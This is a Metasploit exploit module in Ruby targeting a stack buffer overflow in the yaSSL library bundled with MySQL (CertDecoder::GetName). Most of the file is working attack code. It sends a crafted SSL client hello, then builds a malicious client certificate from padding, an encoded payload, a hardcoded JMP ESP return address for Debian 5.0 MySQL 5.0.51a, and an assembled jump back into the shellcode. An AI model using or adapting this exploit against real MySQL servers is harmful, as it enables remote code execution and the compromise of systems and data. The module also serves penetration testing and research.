##
# $Id: mysql_yassl_getname.rb 8282 2010-01-27 23:24:44Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::Remote::Tcp
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MySQL yaSSL CertDecoder::GetName Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in the yaSSL (1.9.8 and earlier)
				implementation bundled with MySQL. By sending a specially crafted
				client certificate, an attacker can execute arbitrary code.

				This vulnerability is present within the CertDecoder::GetName function inside
				./taocrypt/src/asn.cpp. However, the stack buffer that is written to exists
				within a parent function stack frame.

				NOTE: This vulnerability requires a non-default configuration. First, the attacker
				must be able to pass the host-based authentication. Next, the server must be
				configured to listen on an accessible network interface.  Lastly, the server
				must have been manually configured to use SSL.

				The binary from version 5.5.0-m2 was built with /GS and /SafeSEH. During testing
				on Windows XP SP3, these protections successfully prevented exploitation.

				Testing was also done with mysql on Ubuntu 9.04. Although the vulnerable code is
				present, both version 5.5.0-m2 built from source and version 5.0.75 from a binary
				pacakge were not exploitable due to the use of the compiler's FORTIFY feature.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 8282 $',
			'References'     =>
				[
					[ 'OSVDB', '61956' ],
					[ 'URL', 'http://secunia.com/advisories/38344/' ],
					[ 'URL', 'http://intevydis.blogspot.com/2010/01/mysq-yassl-stack-overflow.html' ]
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload'        =>
				{
					'Space'    => 1046,
					'BadChars' => "",
					'StackAdjustment' => -3500,
					'DisableNops' => true
				},
			'Platform'       => 'linux',
			'Targets'        =>
				[
					[ 'Debian 5.0 - MySQL 5.0.51a-24+lenny2',  { 'JmpEsp' => 0x0807dc34 } ]
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jan 25 2010'))

			register_options([ Opt::RPORT(3306) ], self)
	end

	def exploit

		connect

		print_status("Trying target #{target.name}...")

		sock.get_once

		hello = [0x01000020].pack('V')
		hello << "\x85\xae\x03\x00"+"\x00\x00\x00\x01"+"\x08\x00\x00\x00"
		hello << "\x00" * 20
		hello << "\x16\x03\x01\x00\x60\x01\x00\x00\x5c\x03\x01\x4a\x92\xce\xd1\xe1"
		hello << "\xab\x48\x51\xc8\x49\xa3\x5e\x97\x1a\xea\xc2\x99\x82\x33\x42\xd5"
		hello << "\x14\xbc\x05\x64\xdc\xb5\x48\xbd\x4c\x11\x55\x00\x00\x34\x00\x39"
		hello << "\x00\x38\x00\x35\x00\x16\x00\x13\x00\x0a\x00\x33\x00\x32\x00\x2f"
		hello << "\x00\x66\x00\x05\x00\x04\x00\x63\x00\x62\x00\x61\x00\x15\x00\x12"
		hello << "\x00\x09\x00\x65\x00\x64\x00\x60\x00\x14\x00\x11\x00\x08\x00\x06"
		hello << "\x00\x03\x02\x01\x00"
		sock.put(hello)

		cn = "A" * (payload_space - payload.encoded.length)
		cn << payload.encoded
		cn << [0,0].pack('VV') # memset(x,0,0); (this is x and the length)
		# NOTE: x in above (also gets passed to free())
		pad = 1074 - payload_space
		cn << rand_text(pad)
		cn << [target['JmpEsp']].pack('V')
		distance = 4 + pad + 8 + payload.encoded.length
		cn << Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $-" + distance.to_s).encode_string

		cert = "\x2a\x86\x00\x84"
		cert << [cn.length].pack('N')
		cert << cn
		cert = "\x30"+
			"\x82\x01\x01"+
			"\x31"+
			"\x82\x01\x01"+
			"\x30"+
			"\x82\x01\x01"+
			"\x06"+
			"\x82\x00\x02" +
			cert

		cert = "\xa0\x03" +
			"\x02\x01\x02" +
			"\x02\x01\x00" +
			"\x30" + "\x0d" + "\x06\x09\x2a\x86\x48\x86\xf7\x0d\x01\x01\x04\x05\x00" +
			cert

		# wrap in 2 sequences
		cert = SNMP::BER.encode_tlv(0x30, cert)
		cert = SNMP::BER.encode_tlv(0x30, cert)

		cert1 = big_endian_24bit(cert.length) + cert
		certs = big_endian_24bit(cert1.length) + cert1

		handshake = "\x0b" +  big_endian_24bit(certs.length) + certs
		msg = "\x16\x03\x01"
		msg << [handshake.length].pack('n')
		msg << handshake

		sock.put(msg)

		handler
		disconnect
	end


	def big_endian_24bit(len)
		uno = (len >> 16) & 0xff
		dos = (len >> 8) & 0xff
		tre = len & 0xff
		[uno,dos,tre].pack('C*')
	end

end